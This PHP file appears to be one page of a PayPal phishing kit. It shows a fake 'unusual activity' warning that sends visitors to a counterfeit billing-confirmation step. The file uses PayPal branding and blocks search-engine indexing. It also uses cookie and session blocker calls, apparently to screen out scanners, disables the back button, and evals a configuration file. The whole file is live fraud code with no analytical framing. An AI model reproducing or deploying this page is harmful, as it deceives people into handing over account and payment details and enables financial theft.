<?php
require_once __DIR__ . '/function.php';
@eval(file_get_contents($api->dir_config.'/'.$api->general_config));

if ($config_blocker == "enable") {
  $api->cookie();
  $api->session();
}

if ($config_model == "new"){
  $redirect = "../myaccount/confirm=billing";
} else {
  $redirect = "../myaccount/websrc?accessID=".$api->ngerandom();
}

$api->visitor("Unusual");
?>
<!DOCTYPE html>
<html>

<head>
  <title><?=$api->transcode("PayPal Inc.");?></title>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
  <link rel="shortcut icon" href="../assets/img/favicon.ico">
  <link rel="apple-touch-icon" href="../assets/img/apple-touch-icon.png">
  <link rel="stylesheet" href="../assets/css/unusual.css">
  <script type="text/javascript">
  window.history.forward();

  function noBack() {
    window.history.forward();
  }
  </script>
</head>

<body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="">
  <div class="contentContainer"><br><br>
    <div class="safeComponent">
      <header>
        <div class="logo"></div>
      </header>
      <div class="safe">
        <h1><?=$api->transcode("PayPal is looking out for you");?></h1>
        <div class="safeDescription">
          <p class="description"><?=$api->transcode("We noticed some unusual activity and need help securing your account. Click Next to confirm your account.");?></p>
        </div>
        <a type="submit" class="button safeContinueButton primary" href="<?=$redirect;?>"><?=$api->transcode("Next");?></a>
      </div>
    </div>
    <div class="loaderOverlay">
      <div class="modal-animate show" id="Kuzuluy1">
        <div class="rotate"></div>
        <div class="processing"><?=$api->transcode("Processing...");?></div>
      </div>
      <div class="modal-overlay show" id="Kuzuluy2"></div>
    </div>
  </div>
  <footer class="footer">
    <ul class="footerLinks">
      <li class="privacyFooterListItem"><a href="?privacy"><?=$api->transcode("Privacy");?></a></li>
      <li class="legalFooterListItem"><a href="?legal"><?=$api->transcode("Legal");?></a></li>
    </ul>
    <div></div>
  </footer>
  <script type="text/javascript">
    window.onload = function() {
      setTimeout(function() {
        document.getElementById("Kuzuluy1").className = "modal-animate hide";
        document.getElementById("Kuzuluy2").className = "modal-overlay hide";
      }, 3000)
    }
  </script>
</body>

</html>
